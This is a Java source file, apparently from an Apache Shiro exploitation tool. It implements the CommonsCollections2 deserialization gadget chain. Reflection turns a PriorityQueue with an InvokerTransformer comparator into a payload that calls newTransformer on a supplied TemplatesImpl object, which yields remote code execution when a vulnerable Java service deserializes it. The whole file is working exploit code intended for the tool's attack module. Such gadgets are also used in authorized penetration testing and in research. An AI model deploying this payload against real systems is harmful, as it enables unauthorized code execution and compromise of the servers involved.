package com.sma11new.exp.shiro.attack.payloads;

import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"org.apache.commons:commons-collections4:4.0"})
public class CommonsCollections2
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object templates) throws Exception {
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        Object[] queueArray = (Object[])Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;
        return queue;
    }
}

